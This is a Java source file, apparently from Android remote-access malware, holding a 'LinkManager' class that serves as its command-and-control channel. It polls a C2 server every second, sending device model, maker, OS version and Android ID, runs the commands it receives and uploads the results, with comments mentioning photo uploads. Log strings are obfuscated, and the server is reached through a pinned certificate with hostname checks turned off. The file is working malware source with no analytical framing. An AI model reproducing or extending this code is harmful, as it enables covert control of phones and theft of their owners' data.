package com.piupiupiu;

import android.os.Build;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.security.MessageDigest;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class LinkManager {

    private static final String TAG = StrCodec.dec("Ez9TEA==");

    /** 轮询间隔（秒）。命令在此间隔内送达。已压到 1s，回连/响应明显更快。 */
    private static final int POLL_SEC = 1;
    /** 连续拉取已排队命令时的小间隔，避免空转打爆服务端。 */
    private static final int DRAIN_PAUSE_MS = 300;
    /** 失败重连退避上限（秒）。调低，避免网络抖动后重连退避到 8s 以上。 */
    private static final int MAX_BACKOFF_SEC = 10;

    private static final MediaType JSON = MediaType.parse(StrCodec.dec("ESBRGVAIR0ZDNR9jB0cKPEtwQh1YGVVXXmcEOAsZXQ=="));

    private static final LinkManager ourInstance = new LinkManager();

    private final OkHttpClient client;
    private final String baseUrl;
    private final String pollQuery;
    private final String reportQuery;

    private volatile FrameHandler handler;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private volatile int backoffSec = 1;

    /** 下行帧回调。由 Dispatcher 注册，避免 LinkManager 反向依赖 Dispatcher。 */
    public interface FrameHandler {
        void onFrame(String type, JSONObject payload);
    }

    private LinkManager() {
        client = buildClient();

        String deviceID = Settings.Secure.getString(
                CoreService.getContextOfApplication().getContentResolver(),
                Settings.Secure.ANDROID_ID);

        baseUrl = AppConfig.c2Base();
        pollQuery = "?" + AppConfig.PARAM_MODEL + "=" + enc(Build.MODEL)
                + "&" + AppConfig.PARAM_VENDOR + "=" + enc(Build.MANUFACTURER)
                + "&" + AppConfig.PARAM_RELEASE + "=" + enc(Build.VERSION.RELEASE)
                + "&" + AppConfig.PARAM_DEVICE + "=" + enc(deviceID);
        reportQuery = "?" + AppConfig.PARAM_DEVICE + "=" + enc(deviceID);
    }

    /**
     * 构造只信任「公钥固定」证书的 OkHttpClient。
     * 不依赖系统 CA、也不把证书打进 APK，只靠 AppConfig.C2_PIN（SPKI 的 SHA-256）校验对端证书。
     */
    private static OkHttpClient buildClient() {
        X509TrustManager pinTm = new X509TrustManager() {
            @Override
            public void checkClientTrusted(X509Certificate[] chain, String authType) {
                // 客户端侧无需校验服务端下发的客户端证书
            }

            @Override
            public void checkServerTrusted(X509Certificate[] chain, String authType)
                    throws CertificateException {
                if (chain == null || chain.length == 0) {
                    throw new CertificateException(StrCodec.dec("FT1RAUBLRVdYLlEvBVUMPA=="));
                }
                try {
                    MessageDigest md = MessageDigest.getInstance("SHA-256");
                    byte[] spki = chain[0].getPublicKey().getEncoded();
                    String hash = "sha256/" + Base64.encodeToString(md.digest(spki), Base64.NO_WRAP);
                    if (!hash.equals(AppConfig.C2_PIN)) {
                        throw new CertificateException(StrCodec.dec("EzVTAVANT1FLLhRsHV0Lch05UhhYH0VaEHo=") + hash);
                    }
                } catch (Exception e) {
                    throw new CertificateException(StrCodec.dec("ADlPVVoDQ1FBehctBFgANg=="), e);
                }
            }

            @Override
            public X509Certificate[] getAcceptedIssuers() {
                return new X509Certificate[0];
            }
        };

        try {
            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, new TrustManager[]{pinTm}, new SecureRandom());
            SSLSocketFactory sf = ctx.getSocketFactory();
            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String hostname, SSLSession session) {
                    // 对端证书已用 pin 严格校验，这里放行主机名（支持 IP / 任意域名指向面板）。
                    return true;
                }
            };
            return new OkHttpClient.Builder()
                    .sslSocketFactory(sf, pinTm)
                    .hostnameVerifier(hv)
                    .connectTimeout(10, TimeUnit.SECONDS)
                    .readTimeout(30, TimeUnit.SECONDS)
                    .writeTimeout(60, TimeUnit.SECONDS)   // 照片可达数 MB，上传窗口放宽
                    .build();
        } catch (Exception e) {
            throw new RuntimeException(StrCodec.dec("EiVIGV1LVltENBQoTVcJOxU+VVVfCk9eTz4="), e);
        }
    }

    private static String enc(String s) {
        return s == null ? "" : android.net.Uri.encode(s);
    }

    public static LinkManager getInstance() {
        return ourInstance;
    }

    public void setHandler(FrameHandler h) {
        this.handler = h;
    }

    /** 启动轮询循环（幂等）。 */
    public void connect() {
        if (running.getAndSet(true)) {
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                pollLoop();
            }
        }, "c2-poll").start();
    }

    private void pollLoop() {
        while (running.get()) {
            try {
                boolean got;
                do {
                    got = fetchOne();
                    if (got) {
                        Thread.sleep(DRAIN_PAUSE_MS);
                    }
                } while (got && running.get());
                backoffSec = 1;
                sleep(POLL_SEC);
            } catch (Exception e) {
                Log.e(TAG, StrCodec.dec("AD9NGRkNR1tGPxU="), e);
                int wait = backoffSec;
                backoffSec = Math.min(backoffSec * 2, MAX_BACKOFF_SEC);
                sleep(wait);
            }
        }
    }

    /** 拉一条命令。返回 true 表示拿到了一条命令。 */
    private boolean fetchOne() throws Exception {
        Request req = new Request.Builder().url(baseUrl + pollQuery).get().build();
        Response resp = client.newCall(req).execute();
        try {
            if (resp.code() != 200) {
                return false;
            }
            ResponseBody body = resp.body();
            if (body == null) {
                return false;
            }
            String txt = body.string();
            if (txt == null || txt.trim().isEmpty()) {
                return false;
            }
            JSONObject frame = new JSONObject(txt);
            String type = frame.optString(AppConfig.FRAME_TYPE, "");
            if (type.length() == 0) {
                return false; // 空 {} => 当前无命令
            }
            JSONObject payload = frame.optJSONObject(AppConfig.FRAME_PAYLOAD);
            if (payload == null) {
                payload = new JSONObject();
            }
            FrameHandler h = handler;
            if (h != null) {
                h.onFrame(type, payload);
            }
            return true;
        } finally {
            resp.close();
        }
    }

    /** 上报一条结果帧（命令执行结果）。返回是否发送成功（失败原因会记在客户端日志）。 */
    public boolean send(String type, Object payload) {
        try {
            JSONObject frame = new JSONObject();
            frame.put(AppConfig.FRAME_TYPE, type);
            frame.put(AppConfig.FRAME_PAYLOAD, payload);
            RequestBody body = RequestBody.create(JSON, frame.toString());
            Request req = new Request.Builder().url(baseUrl + reportQuery).post(body).build();
            Response resp = client.newCall(req).execute();
            resp.close();
            return true;
        } catch (Exception e) {
            Log.e(TAG, StrCodec.dec("AjVRGksfBlRLMx0pCQ=="), e);
            return false;
        }
    }

    private void sleep(int sec) {
        try {
            Thread.sleep(sec * 1000L);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}
